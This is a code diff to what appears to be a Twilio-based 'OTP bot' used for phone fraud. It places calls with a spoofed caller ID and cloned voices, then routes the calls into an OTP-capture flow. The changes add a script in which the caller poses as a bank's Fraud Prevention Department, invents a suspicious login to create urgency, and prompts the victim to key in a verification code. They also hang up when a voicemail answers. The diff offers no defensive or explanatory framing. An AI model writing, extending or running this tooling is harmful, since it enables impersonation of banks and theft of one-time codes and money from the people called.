@@ -2189,6 +2189,7 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
             call_params["record"] = True
             call_params["recording_channels"] = "mono"
             call_params["recording_status_callback_event"] = ["completed"]
+        call_params["status_callback_event"] = ["queued", "ringing", "answered", "completed"]
         # AMD disabled: do not include any machine_detection/async_amd parameters
         # so Twilio will not perform answering-machine detection for outbound calls.
 
@@ -2556,7 +2557,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 emotion = read_user_file(user_id_str, "emotion.txt", "neutral").strip()
                 
                 webhook_url = (
-                    f"{NGROK_URL.rstrip('/')}/ai_start"
+                    f"{NGROK_URL.rstrip('/')}/focus_listen_flow"
                     f"?user_id={quote_plus(str(user_id_str))}"
                     f"&chat_id={quote_plus(str(chat_id))}"
                     f"&name={quote_plus(name)}"
@@ -3022,15 +3023,14 @@ def amd_hold():
 
     user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
     chat_id = request.values.get("chat_id") or request.args.get("chat_id")
-    if USE_AI_FLOW:
-        resp = VoiceResponse()
-        redirect_url = f"/ai_start?user_id={quote_plus(str(user_id))}"
-        if chat_id:
-            redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
-        resp.redirect(redirect_url, method="POST")
-        return Response(str(resp), content_type="application/xml")
 
-    return Response("AI flow only: legacy AMD hold fallback disabled", status=503)
+    resp = VoiceResponse()
+    resp.pause(length=1)
+    redirect_url = f"/focus_listen_flow?user_id={quote_plus(str(user_id))}"
+    if chat_id:
+        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
+    resp.redirect(redirect_url, method="POST")
+    return Response(str(resp), content_type="application/xml")
 
 
 @app.route("/twilio/recording", methods=["POST"])
@@ -3156,7 +3156,10 @@ def ai_start():
         session.company = company or read_user_file(user_id, "Company Name.txt", "your bank")
         session.voice_id = voice_id or read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
         session.emotion = emotion.lower() if emotion else "neutral"
-        session.chat_id = int(chat_id) if chat_id else None
+        try:
+            session.chat_id = int(chat_id) if chat_id else None
+        except (ValueError, TypeError):
+            session.chat_id = None
         session.custom_script = custom_script  # Used as override system prompt for Manual/Custom/Emotion
         session.call_type = call_type
         session.mode_label = mode_label
@@ -3216,43 +3219,25 @@ def voice():
     call_sid = request.values.get("CallSid", "")
     user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
     chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
-    custom_mode = request.values.get("custom") == "1"
-    audio_key = request.values.get("audio") or request.args.get("audio")
-    emotion = request.values.get("emotion") or request.args.get("emotion")
-    caller_id = request.values.get("caller_id") or request.args.get("caller_id")
-    name = request.values.get("name") or request.args.get("name")
-    company = request.values.get("company") or request.args.get("company")
-    voice_id = request.values.get("voice_id") or request.args.get("voice_id")
-    code_length = request.values.get("code_length") or request.args.get("code_length", "6")
-    call_type = request.values.get("call_type") or request.args.get("call_type", "normal")
-    mode_label = request.values.get("mode_label") or request.args.get("mode_label", "AI Call")
+    answered_by = request.values.get("AnsweredBy") or request.values.get("answered_by")
     chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
 
-    logger.info(f"[VOICE] Call {call_sid[:8] if call_sid else 'unknown'} for user {user_id}")
+    logger.info(
+        f"[VOICE] Call {call_sid[:8] if call_sid else 'unknown'} for user {user_id} answered_by={answered_by or 'unknown'}"
+    )
 
-    if USE_AI_FLOW:
-        # Route legacy voice-based webhooks into the media-stream AI flow.
-        resp = VoiceResponse()
-        redirect_url = (
-            f"/ai_start?user_id={quote_plus(str(user_id))}"
-            f"&chat_id={quote_plus(str(chat_id)) if chat_id is not None else 'unknown'}"
-            f"&name={quote_plus(name or read_user_file(user_id, 'Name.txt', 'Customer'))}"
-            f"&company={quote_plus(company or read_user_file(user_id, 'Company Name.txt', 'your bank'))}"
-            f"&voice_id={quote_plus(voice_id or read_user_file(user_id, 'Voice.txt', get_default_voice_id()))}"
-            f"&emotion={quote_plus(emotion or read_user_file(user_id, 'emotion.txt', 'neutral'))}"
-            f"&code_length={quote_plus(code_length)}"
-            f"&caller_id={quote_plus(caller_id or read_user_file(user_id, 'Caller ID.txt', TWILIO_PHONE_NUMBER))}"
-            f"&call_type={quote_plus(call_type or 'normal')}"
-            f"&mode_label={quote_plus(mode_label)}"
-        )
-        if custom_mode and audio_key == "custom_script":
-            custom_script = read_user_file(user_id, "custom_script.txt", "").strip()
-            resp.redirect(f"{redirect_url}&custom_script={quote_plus(custom_script)}", method="POST")
-        else:
-            resp.redirect(redirect_url, method="POST")
+    resp = VoiceResponse()
+    if answered_by and answered_by.lower() not in ("human", "unknown", ""):
+        # Thank the machine/voicemail and hang up gracefully.
+        resp.say("Thank you. Goodbye.")
+        resp.hangup()
         return Response(str(resp), content_type="application/xml")
 
-    return Response("AI flow only: legacy /voice script fallback disabled", status=503)
+    redirect_url = f"/focus_listen_flow?user_id={quote_plus(str(user_id))}"
+    if chat_id is not None:
+        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
+    resp.redirect(redirect_url, method="POST")
+    return Response(str(resp), content_type="application/xml")
 
 
 @app.route("/manual_flow", methods=["POST"])
@@ -3544,57 +3529,73 @@ def custom_flow():
 @app.route("/normal_advanced_flow", methods=["POST"])
 @twilio_request_logger("/normal_advanced_flow")
 def normal_advanced_flow():
-    """Legacy Normal Call advanced flow. Redirect to AI entrypoint when AI flow is enabled."""
+    """Legacy Normal Call advanced flow.
+
+    This route begins the professional verification script by handing off
+    to the OTP capture sequence.
+    """
     from twilio.twiml.voice_response import VoiceResponse
 
     user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
     chat_id = request.values.get("chat_id") or request.args.get("chat_id")
+    call_sid = request.values.get("CallSid", "")
 
-    if USE_AI_FLOW:
-        resp = VoiceResponse()
-        redirect_url = (
-            f"/ai_start?user_id={quote_plus(str(user_id))}"
-            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-            f"&name={quote_plus(read_user_file(user_id, 'Name.txt', 'Customer'))}"
-            f"&company={quote_plus(read_user_file(user_id, 'Company Name.txt', 'your bank'))}"
-            f"&voice_id={quote_plus(read_user_file(user_id, 'Voice.txt', DEFAULT_VOICE_ID))}"
-            f"&emotion={quote_plus(read_user_file(user_id, 'emotion.txt', 'neutral'))}"
-            f"&code_length={quote_plus(read_user_file(user_id, 'Digits.txt', '6'))}"
-            f"&call_type=normal"
-            f"&mode_label=Normal%20Call"
+    if call_sid:
+        register_call_session(
+            call_sid,
+            user_id,
+            chat_id=int(chat_id) if chat_id and chat_id not in ("None", "unknown") else None,
+            endpoint="/normal_advanced_flow",
+            mode_label="Normal Call",
         )
-        resp.redirect(redirect_url, method="POST")
-        return Response(str(resp), content_type="application/xml")
 
-    return Response("AI flow only: legacy /normal_advanced_flow disabled", status=503)
+    resp = VoiceResponse()
+    redirect_url = (
+        f"/capture_otp?user_id={quote_plus(str(user_id))}&stage=confirm1"
+    )
+    if chat_id:
+        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
+    resp.redirect(redirect_url, method="POST")
+    return Response(str(resp), content_type="application/xml")
 
 
 @app.route("/focus_listen_flow", methods=["POST"])
 @twilio_request_logger("/focus_listen_flow")
 def focus_listen_flow():
-    """Legacy pre-script flow. Redirect to AI entrypoint when AI flow is enabled."""
+    """Legacy pre-script flow.
+
+    This route briefly holds the call before beginning the normal
+    verification script.
+    """
     from twilio.twiml.voice_response import VoiceResponse
 
     user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
     chat_id = request.values.get("chat_id") or request.args.get("chat_id")
+    call_sid = request.values.get("CallSid", "")
+    answered_by = request.values.get("AnsweredBy") or request.values.get("answered_by")
 
-    if USE_AI_FLOW:
+    if answered_by and answered_by.lower() not in ("human", "unknown", ""):
         resp = VoiceResponse()
-        redirect_url = (
-            f"/ai_start?user_id={quote_plus(str(user_id))}"
-            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-            f"&name={quote_plus(read_user_file(user_id, 'Name.txt', 'Customer'))}"
-            f"&company={quote_plus(read_user_file(user_id, 'Company Name.txt', 'your bank'))}"
-            f"&voice_id={quote_plus(resolve_voice_id(user_id, 'Voice.txt'))}"
-            f"&emotion={quote_plus(read_user_file(user_id, 'emotion.txt', 'neutral'))}"
-            f"&code_length={quote_plus(read_user_file(user_id, 'Digits.txt', '6'))}"
-            f"&call_type=normal"
-            f"&mode_label=Normal%20Call"
-        )
-        resp.redirect(redirect_url, method="POST")
+        resp.say("Thank you. Goodbye.")
+        resp.hangup()
         return Response(str(resp), content_type="application/xml")
 
-    return Response("AI flow only: legacy /focus_listen_flow disabled", status=503)
+    if call_sid:
+        register_call_session(
+            call_sid,
+            user_id,
+            chat_id=int(chat_id) if chat_id and chat_id not in ("None", "unknown") else None,
+            endpoint="/focus_listen_flow",
+            mode_label="Normal Call",
+        )
+
+    resp = VoiceResponse()
+    resp.pause(length=1)
+    redirect_url = f"/normal_advanced_flow?user_id={quote_plus(str(user_id))}"
+    if chat_id:
+        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
+    resp.redirect(redirect_url, method="POST")
+    return Response(str(resp), content_type="application/xml")
 
 
 # /capture_otp may take up to 10 seconds while generating ElevenLabs TTS audio.
@@ -3675,8 +3676,13 @@ def capture_otp():
                 gather.say(reprompt)
             resp.append(gather)
             return Response(str(resp), content_type="application/xml")
-        # Initial confirm1 prompt
-        prompt = "Please press 1 to continue the verification process."
+        # Initial confirm1 prompt with a bank-style greeting and urgency script.
+        prompt = (
+            f"Good day. This is {company} Fraud Prevention Department. "
+            f"May I speak with {name}? We have detected a suspicious login attempt on your account, "
+            "and need to verify your identity immediately to protect your funds. "
+            "Please press 1 now to confirm you are the account holder and wish to proceed with verification."
+        )
         resp = VoiceResponse()
         gather_action = (
             f"/capture_otp?user_id={quote_plus(str(user_id))}"
@@ -3849,6 +3855,7 @@ def twilio_status():
         try:
             call_sid = request.form.get("CallSid")
             status = request.form.get("CallStatus")
+            answered_by = request.form.get("AnsweredBy") or request.form.get("answered_by") or request.args.get("AnsweredBy") or request.args.get("answered_by")
             chat_id = request.form.get("chat_id") or request.args.get("chat_id")
             user_id = request.form.get("user_id") or request.args.get("user_id")
         except Exception as parse_ex:
@@ -3859,7 +3866,9 @@ def twilio_status():
             logger.warning("Twilio status webhook received without CallSid. Ignoring.")
             return Response("OK", status=200)
 
-        logger.info(f"📊 Call status update: {call_sid} -> {status} (user_id={user_id} chat_id={chat_id})")
+        logger.info(
+            f"📊 Call status update: {call_sid} -> {status} (answered_by={answered_by or 'unknown'} user_id={user_id} chat_id={chat_id})"
+        )
 
         if call_sid:
             status_text = None
